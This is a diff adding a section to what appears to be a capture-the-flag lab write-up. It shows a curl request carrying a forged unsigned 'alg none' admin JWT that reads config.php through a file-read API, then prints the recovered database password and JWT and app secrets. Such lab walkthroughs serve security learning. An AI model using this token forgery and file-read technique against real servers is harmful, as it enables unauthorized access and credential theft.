@@ -234,3 +234,27 @@ Content-Type: text/html; charset=UTF-8
 </html>
 Second flag found!
 
+Now having access to admin and being able to curl the website I am going to pry arround with some of the directories I found earlier. 
+Using curl and the administrative information I went and saved the config.php to a config.txt file 
+curl -i -H 'Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImxhdXJhLmhheWVzIiwicm9sZSI6ImFkbWluIn0.' http://10.130.137.100/api/files.php?name=/var/www/html/config.php > config.txt
+After deleting the extra information at the top of the file and running this command I was able to simplify the information 
+jq -r ".content" config.txt > config.php
+
+cat config.php
+<?php
+define('DB_HOST', 'localhost');
+define('DB_NAME', 'nexusdb');
+define('DB_USER', 'app_user');
+define('DB_PASS', 'D3v0ps!2024');
+define('JWT_SECRET', 'nexus_jwt_s3cr3t_2024');
+define('APP_SECRET', 'nexus_app_k3y_2024');
+
+function get_db() {
+    $pdo = new PDO('mysql:host='.DB_HOST.';dbname='.DB_NAME, DB_USER, DB_PASS);
+    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
+    return $pdo;
+}
+?>
+
+
+
